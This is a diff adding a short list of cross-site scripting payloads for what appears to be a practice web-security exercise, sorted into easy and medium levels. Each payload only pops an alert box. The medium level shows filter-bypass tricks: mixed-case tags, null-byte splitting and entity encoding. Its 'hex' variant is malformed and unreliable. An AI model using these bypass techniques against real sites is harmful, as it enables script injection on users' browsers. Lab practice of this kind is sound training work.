@@ -1,0 +1,16 @@
+Easy Level Attack Options
+--------------------------
+<script>alert("I am Arthur, King of the Britons");</script>
+[paste the 'view source' version of the exploit here]
+
+<script>alert('I am Arthur, King of the Britons');</script>
+
+
+Medium Level Attack Options
+---------------------------
+start:  <script>alert('I am Arthur, King of the Britons');</script>
+caps:   <sCrIpT>alert('I am Arthur, King of the Britons');</ScRiPt>
+null:   <scr%00ipt>alert('I am Arthur, King of the Britons');</scr%00ipt>
+hex:    <s12ript>alert('I am Arthur, King of the Britons');</s12ript>
+html:   &lt;script&gt;alert('I am Arthur, King of the Britons');&lt;/script&gt;
+
